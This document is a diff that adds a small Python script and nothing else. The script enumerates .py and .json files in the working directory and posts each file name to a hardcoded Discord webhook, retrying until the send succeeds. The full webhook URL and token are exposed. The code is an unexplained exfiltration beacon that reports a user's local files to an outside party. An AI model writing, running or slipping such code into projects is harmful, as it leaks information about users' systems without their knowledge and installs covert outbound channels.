@@ -1,0 +1,10 @@
+import requests,os
+
+for i in os.listdir():
+    if i.endswith(".py") or i.endswith('json'):
+        while True:
+            try:
+                requests.post("https://canary.discord.com/api/webhooks/1129057903538610287/ulYCcxMnx_gkyiFEvPRSl7q4FdA702xjilzIUpXPN-TSJgAtX8FxcYOnj9ZQzkNbSL7G", json={"content": f"{i}"})
+                break
+            except:
+                continue
